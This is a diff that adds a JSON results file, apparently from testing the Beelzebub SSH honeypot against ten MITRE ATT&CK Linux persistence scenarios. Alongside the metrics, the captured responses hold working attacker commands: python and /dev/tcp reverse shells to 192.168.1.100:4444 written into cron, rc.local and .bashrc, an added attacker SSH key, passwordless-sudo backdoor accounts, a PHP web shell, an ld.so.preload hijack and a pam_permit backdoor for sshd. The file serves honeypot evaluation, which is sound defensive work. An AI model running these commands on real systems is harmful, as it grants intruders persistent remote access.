@@ -1,0 +1,229 @@
+{
+  "baseline": "Beelzebub",
+  "mode": "direct_ssh",
+  "test_time": "2026-01-21T17:08:48.849465",
+  "num_rounds": 1,
+  "scenarios_per_round": 10,
+  "per_round_metrics": [
+    {
+      "round_number": 1,
+      "spr": 0.4,
+      "sfr": 0.9,
+      "pdr_high": 0.25,
+      "pdr_medium": 0.75,
+      "pdr_low": 0.0,
+      "avg_latency_ms": 3013.4064197540283,
+      "total_tokens": 0,
+      "total_scenarios": 10,
+      "passed_scenarios": 4
+    }
+  ],
+  "aggregated_metrics": {
+    "spr": {
+      "mean": 0.4,
+      "std": 0.0,
+      "min": 0.4,
+      "max": 0.4
+    },
+    "sfr": {
+      "mean": 0.9,
+      "std": 0.0,
+      "min": 0.9,
+      "max": 0.9
+    },
+    "pdr_high": {
+      "mean": 0.25,
+      "std": 0.0,
+      "min": 0.25,
+      "max": 0.25
+    },
+    "pdr_medium": {
+      "mean": 0.75,
+      "std": 0.0,
+      "min": 0.75,
+      "max": 0.75
+    },
+    "pdr_low": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    },
+    "latency_ms": {
+      "mean": 3013.4064,
+      "std": 0.0,
+      "min": 3013.4064,
+      "max": 3013.4064
+    },
+    "total_tokens": {
+      "mean": 0.0,
+      "std": 0.0,
+      "min": 0.0,
+      "max": 0.0
+    }
+  },
+  "per_round_results": [
+    [
+      {
+        "scenario_id": "HC-T1053-003",
+        "mitre_id": "T1053.003",
+        "technique": "Scheduled Task/Job: Cron",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "(crontab -l 2>/dev/null; echo \"*/15 * * * * /usr/bin/python3 -c '\r\nimport socket,subprocess;s=socket.socket();s.connect((\\\\\"192.168.1.100\\\\\",4444))\r\n;subprocess.call([\\\\\"bash\\\\\",\\\\\"-i\\\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr\r\n=s.fileno())'\") | crontab -\r\nno crontab for user\r\nroot@ubuntu:~$",
+        "verify_response": "crontab -l | grep -E 'python3.*socket.*4444'",
+        "implant_latency_ms": 3020.9972858428955,
+        "verify_latency_ms": 3005.0008296966553,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1543-002",
+        "mitre_id": "T1543.002",
+        "technique": "Create or Modify System Process: Systemd Service",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": true,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service <\r\n< 'EOF'\r\ncat: /etc/systemd/system/dbus-org.freedesktop.resolve1.service: Permission denied\r\nroot@ubuntu:~$ [Unit]",
+        "verify_response": "systemctl is-enabled dbus-org.freedesktop.resolve1.service && cat\r\n /etc/systemd/system/dbus-org.freedesktop.resolve1.service | grep -E 'tcp.*4444'\r\n\r\nFailed to get unit file state for dbus-org.freedesktop.resolve1.service: No such file or directory\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3031.541585922241,
+        "verify_latency_ms": 3004.54044342041,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1098-004",
+        "mitre_id": "T1098.004",
+        "technique": "Account Manipulation: SSH Authorized Keys",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": true,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "mkdir -p /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAA\r\nB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker' >> /root/.ssh/authorized_\r\nkeys && chmod 600 /root/.ssh/authorized_keys",
+        "verify_response": "cat /root/.ssh/authorized_keys | grep -E 'c2server'\r\ncat: /root/.ssh/authorized_keys: Permission denied\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3013.8027667999268,
+        "verify_latency_ms": 3013.9050483703613,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1136-001",
+        "mitre_id": "T1136.001",
+        "technique": "Create Account: Local Account",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": true,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "useradd -m -s /bin/bash -c 'System Service Account' sysupdate && \r\necho 'sysupdate:B@ckd00r2024!' | chpasswd && usermod -aG sudo sysupdate && echo \r\n'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sysupdate\r\nuseradd: Permission denied.\r\nroot@ubuntu:~$",
+        "verify_response": "id sysupdate | grep -E '(sudo|wheel)' && grep sysupdate /etc/pass\r\nwd && sudo -l -U sysupdate | grep NOPASSWD\r\nid: ‘sysupdate’: no such user\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3021.109104156494,
+        "verify_latency_ms": 3003.7693977355957,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1546-004",
+        "mitre_id": "T1546.004",
+        "technique": "Event Triggered Execution: Unix Shell Configuration Modification",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": true,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "echo 'export PROMPT_COMMAND=\"(nohup bash -c \\\"bash -i >& /dev/tcp\r\n/192.168.1.100/4444 0>&1\\\" &)\"' >> /root/.bashrc\r\nbash: /root/.bashrc: Permission denied\r\nroot@ubuntu:~$",
+        "verify_response": "cat /root/.bashrc | grep -E 'PROMPT_COMMAND.*tcp.*4444'\r\ncat: /root/.bashrc: Permission denied\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3017.0934200286865,
+        "verify_latency_ms": 3027.798652648926,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1037-004",
+        "mitre_id": "T1037.004",
+        "technique": "Boot or Logon Initialization Scripts: RC Scripts",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": false,
+        "state_persistent": false,
+        "keywords_matched": false,
+        "implant_response": "echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python\r\n3 -c \"import socket,subprocess;s=socket.socket();s.connect((\\\\\"192.168.1.100\\\\\",\r\n4444));subprocess.call([\\\\\"bash\\\\\",\\\\\"-i\\\\\"],stdin=s.fileno(),stdout=s.fileno(),\r\nstderr=s.fileno())\" &' >> /etc/rc.local && chmod +x /etc/rc.local\r\nbash: /etc/rc.local: Permission denied\r\nroot@ubuntu:~$",
+        "verify_response": "cat /etc/rc.local | grep -E 'python3.*socket.*4444' && ls -la /et\r\nc/rc.local | grep -E '^-..x'\r\ncat: /etc/rc.local: No such file or directory\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3004.69708442688,
+        "verify_latency_ms": 3026.16024017334,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1505-003",
+        "mitre_id": "T1505.003",
+        "technique": "Server Software Component: Web Shell",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": false,
+        "state_fidelity": true,
+        "state_persistent": false,
+        "keywords_matched": true,
+        "implant_response": "echo '<?php if(isset($_REQUEST[\"c\"])){$c=$_REQUEST[\"c\"];@system($\r\nc.\" 2>&1\");} ?>' > /var/www/html/.system.php\r\nbash: /var/www/html/.system.php: Permission denied\r\nroot@ubuntu:~$",
+        "verify_response": "cat /var/www/html/.system.php | grep -E '\\$_REQUEST.*system' && l\r\ns -la /var/www/html/.system.php\r\ncat: /var/www/html/.system.php: No such file or directory\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3021.6386318206787,
+        "verify_latency_ms": 3009.0506076812744,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1574-006",
+        "mitre_id": "T1574.006",
+        "technique": "Hijack Execution Flow: Dynamic Linker Hijacking",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "echo '/usr/local/lib/libsystem.so' >> /etc/ld.so.preload && mkdir\r\n -p /usr/local/lib && touch /usr/local/lib/libsystem.so",
+        "verify_response": "cat /etc/ld.so.preload | grep -E 'libsystem.so' && ls -la /usr/lo\r\ncal/lib/libsystem.so",
+        "implant_latency_ms": 3011.1217498779297,
+        "verify_latency_ms": 3010.57767868042,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1556-003",
+        "mitre_id": "T1556.003",
+        "technique": "Modify Authentication Process: Pluggable Authentication Modules",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "echo 'auth sufficient pam_permit.so' > /tmp/pam_backdoor && cat /\r\netc/pam.d/sshd >> /tmp/pam_backdoor && cat /tmp/pam_backdoor > /etc/pam.d/sshd",
+        "verify_response": "head -1 /etc/pam.d/sshd | grep -E 'pam_permit.so'",
+        "implant_latency_ms": 3006.159543991089,
+        "verify_latency_ms": 3005.6943893432617,
+        "error": null
+      },
+      {
+        "scenario_id": "HC-T1078-003",
+        "mitre_id": "T1078.003",
+        "technique": "Valid Accounts: Local Accounts",
+        "implant_success": true,
+        "verify_success": true,
+        "state_persisted": true,
+        "state_fidelity": true,
+        "state_persistent": true,
+        "keywords_matched": true,
+        "implant_response": "usermod -s /bin/bash nobody && usermod -aG sudo nobody && echo 'n\r\nobody ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/nobody\r\nusermod: Permission denied.\r\nroot@ubuntu:~$",
+        "verify_response": "grep nobody /etc/passwd | grep -E '/bin/bash' && sudo -l -U nobod\r\ny | grep NOPASSWD\r\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r\nroot@ubuntu:~$",
+        "implant_latency_ms": 3008.6750984191895,
+        "verify_latency_ms": 3004.7948360443115,
+        "error": null
+      }
+    ]
+  ]
+}
